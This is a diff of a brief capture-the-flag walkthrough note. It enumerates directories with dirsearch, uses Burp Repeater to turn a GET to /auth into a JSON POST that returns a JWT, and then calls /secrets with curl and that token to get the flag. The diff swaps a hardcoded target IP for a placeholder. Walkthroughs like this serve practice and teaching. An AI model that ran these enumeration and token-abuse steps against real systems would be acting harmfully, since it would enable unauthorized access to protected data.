@@ -1,7 +1,8 @@
 python3 dirsearch.py -u {url} -w db/dicc.txt
+//here u find directories, we need /auth and /secret 
 
 {url}/auth
-
+and go to burp, send to repeater 
 change GET to POST and add:
 
 Content-type: application/json
@@ -13,8 +14,7 @@ Content-type: application/json
 u will get a token
 after go to terminal and add that token here 
 
-curl -X GET http://34.89.138.139:32535/secrets \
--H "Authorization: JWT {token}" \
--H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+curl -X GET {link}/secrets \
+-H "Authorization: JWT {token}" 
 
 heres your flag
